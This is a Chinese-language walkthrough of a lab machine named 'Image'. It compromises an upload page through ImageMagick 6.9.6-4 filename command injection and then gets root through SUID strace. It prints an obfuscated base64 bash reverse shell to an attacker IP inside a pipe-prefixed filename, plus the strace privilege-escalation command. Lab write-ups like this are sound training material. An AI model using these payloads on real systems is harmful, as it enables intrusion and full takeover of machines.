---
description: Linux / 中等 / ImageMagick 6.9.6-4 / shell命令注入 / SUID提权
---

# ✔️ Image

## 建立立足点

### 信息收集

* 使用Nmap对目标系统的开放端口进行扫描：

```bash
nmap -sC -sV -p- -oA image 192.168.210.178 --open
```

<figure><img src="../../.gitbook/assets/1 (27).png" alt=""><figcaption></figcaption></figure>

* 首先查看80端口的Web页面进行检查，是一个有上传功能的界面，猜测可能是一个文件上传漏洞：

<figure><img src="../../.gitbook/assets/2 (27).png" alt=""><figcaption></figcaption></figure>

* 根据尝试上传图片的返回信息，目标系统只接受后缀为JPEG和PNG格式的图片文件：

<figure><img src="../../.gitbook/assets/3 (23).png" alt=""><figcaption></figcaption></figure>

* 上传成功一个测试图片后，发现返回了当前正在运行的ImageMagick的版本号：6.9.6-4

<figure><img src="../../.gitbook/assets/4 (26).png" alt=""><figcaption></figcaption></figure>

### 漏洞查阅

* 搜索公开已知的漏洞发现有一个命令注入的漏洞：

<figure><img src="../../.gitbook/assets/5 (27).png" alt=""><figcaption></figcaption></figure>

### 漏洞利用

* 根据漏洞描述，得知打开任何以管道符（|）字符开头的图像文件时，ImageMagick将执行文件名剩余部分的命令，这意味着构建一个以管道符开头且包含反弹shell的图片文件名后，再次上传即图片可触发该漏洞：

<figure><img src="../../.gitbook/assets/6 (26).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/7 (26).png" alt=""><figcaption></figcaption></figure>

```bash
# 构建过程
cp test.png '|test.png'
echo -n 'bash -i >& /dev/tcp/192.168.45.234/4444 0>&1' | base64
cp test.png '|test"`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIzNC80NDQ0IDA+JjE=| base64 -d | bash`".png'
```

<figure><img src="../../.gitbook/assets/8 (26).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/9 (25).png" alt=""><figcaption></figcaption></figure>

### GET SHELL

* 本机做好监听即可成功获取到shell：

<figure><img src="../../.gitbook/assets/10 (27).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/11 (26).png" alt=""><figcaption></figcaption></figure>

## 权限提升

### 本地信息收集

* 简单手动枚举一下：

```bash
find / -perm -u=s -type f 2>/dev/null
```

<figure><img src="../../.gitbook/assets/12 (25).png" alt=""><figcaption></figcaption></figure>

### 漏洞利用

* 根据枚举结果发现有很多文件设置了SUID位，运气很好，第一个strace就在GTFOBins中找到了对应可以提权的命令：

<figure><img src="../../.gitbook/assets/13 (25).png" alt=""><figcaption></figcaption></figure>

### ROOT

* 直接使用该命令提权成功，ROOT!

```bash
strace -o /dev/null /bin/sh -p
```

<figure><img src="../../.gitbook/assets/14 (24).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/15 (22).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/16 (21).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
本例属于简单级别的机器，端口开放的少，不用太多枚举就能锁定漏洞，构建文件名需要多次尝试但其利用过程简单。提权过程也很简单，常规的手动枚举即可找到可以利用的点。
{% endhint %}
